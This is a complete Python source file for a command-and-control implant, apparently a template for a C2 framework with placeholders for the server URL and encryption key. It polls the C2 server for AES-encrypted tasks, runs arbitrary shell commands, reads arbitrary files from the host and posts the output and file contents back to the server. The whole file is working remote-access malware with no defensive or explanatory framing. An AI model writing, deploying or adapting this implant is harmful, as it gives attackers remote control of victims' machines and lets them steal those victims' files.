import requests
import json
import subprocess
import base64
import os
from Crypto.Cipher import AES
import binascii

C2_URL = "{{C2_URL}}"
ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}"

def encrypt_data(data):
    key = ENCRYPTION_KEY.encode()
    cipher = AES.new(key, AES.MODE_ECB)
    padded_data = data + " " * (16 - len(data) % 16)
    encrypted = cipher.encrypt(padded_data.encode())
    return base64.b64encode(encrypted).decode()

def decrypt_data(encrypted_data):
    key = ENCRYPTION_KEY.encode()
    cipher = AES.new(key, AES.MODE_ECB)
    decrypted = cipher.decrypt(base64.b64decode(encrypted_data))
    return decrypted.decode().rstrip()

def checkin():
    try:
        response = requests.get(f"{C2_URL}/checkin")
        if response.status_code == 200:
            return decrypt_data(response.text)
    except Exception as e:
        print(f"Checkin failed: {e}")
    return None

def send_response(task_id, data):
    encrypted_data = encrypt_data(json.dumps(data))
    requests.post(f"{C2_URL}/response", data={"task_id": task_id, "process_response": encrypted_data})

def execute_shell(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return {"output": result.stdout + result.stderr, "status": "success"}
    except Exception as e:
        return {"output": str(e), "status": "error"}

def download_file(path):
    try:
        with open(path, "rb") as f:
            file_data = base64.b64encode(f.read()).decode()
        return {"file_data": file_data, "status": "success"}
    except Exception as e:
        return {"output": str(e), "status": "error"}

def main():
    while True:
        task = checkin()
        if not task:
            continue
        
        task_data = json.loads(task)
        task_id = task_data.get("task_id")
        command = task_data.get("command")
        params = task_data.get("params")
        
        if command == "shell":
            result = execute_shell(params["command"])
            send_response(task_id, result)
        elif command == "download":
            result = download_file(params["path"])
            send_response(task_id, result)

if __name__ == "__main__":
    main()